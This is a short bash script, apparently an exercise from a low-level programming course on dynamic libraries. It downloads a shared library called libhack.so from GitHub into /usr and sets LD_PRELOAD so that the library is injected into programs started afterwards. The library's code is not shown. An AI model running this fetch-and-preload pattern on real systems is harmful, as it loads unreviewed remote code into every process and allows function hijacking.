#!/bin/bash
wget -P /usr https://github.com/Viestar/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD=/usr/libhack.so